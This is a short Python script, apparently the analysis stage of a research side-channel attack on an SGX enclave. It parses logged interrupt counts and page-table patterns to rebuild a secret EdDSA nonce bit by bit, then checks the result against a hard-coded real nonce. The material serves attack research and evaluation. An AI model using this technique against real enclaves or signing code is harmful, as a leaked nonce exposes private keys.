#!/usr/bin/python3
from pprint import pprint
import re

INFILE          = 'measurements_raw.txt'
MPI_SET_PATTERN = '111111000'
THRESHOLD       = 50
NONCE           = '0x4f71d012df3c371af3ea4dc38385ca5bb7272f90cb1b008b3ed601c7'\
                  '6de1d496e30cbf625f0a756a678d8f256d5325595cccc83466f36db18f'\
                  '0178eb9925edd3'

ipis = []
with open(INFILE, 'r') as f:
    for l in f.readlines():
        m = re.search('IPI (\d+) with PTE set 0x([0-9A-Fa-f]+)', l)
        if m:
            ipi_nb = int(m.groups()[0])
            pte_set = int(m.groups()[1], base=16)
            ipis.append((ipi_nb, pte_set))
     
#print("gsgx driver recorded (ipi_nb, pte_set):\n")
#pprint(ipis)

ipis = [ipi for (ipi, ptes) in ipis if ptes == int(MPI_SET_PATTERN, base=2)]

ipi_lst = []
lst = []
ipi_prev = ipis[0]
for ipi in ipis:
    delta = ipi - ipi_prev
    ipi_prev = ipi
    if (delta > THRESHOLD):
        ipi_lst.append(lst)
        lst = []
    lst.append((ipi, delta))
ipi_lst.append(lst)

print("grouped nonce bits (ipi_nb, delta):\n");
pprint(ipi_lst)

nonce = ''
for b in ipi_lst:
    if len(b) >= 2:
        nonce += '1'
    else:
        nonce += '0'

r = int(nonce, 2)
n = int(NONCE, 16)

print("\nrecovered EdDSA nonce ({0} bits):\n".format(len(ipi_lst)))
print("\n{0} (recovered)\n{1} (real)".format(hex(r), hex(n)))
print("\n{0} (recovered)\n{1} (real)".format(bin(r), bin(n)))
